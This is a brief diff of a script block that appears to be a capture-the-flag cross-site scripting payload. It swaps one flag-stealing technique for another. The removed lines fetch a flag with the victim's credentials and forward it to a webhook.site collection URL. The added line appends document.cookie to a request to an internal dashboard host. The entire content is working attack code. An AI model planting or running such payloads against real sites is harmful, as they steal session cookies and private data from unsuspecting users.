@@ -1,5 +1,3 @@
 <script>
-fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
-  .then(r => r.json())
-  .then(d => fetch('https://webhook.site/3f091e74-430d-48d7-8400-150f5df24569?flag=' + d.flag))
+fetch('http://dashboard:5000/api/fetchflag?c='+document.cookie)
 </script>
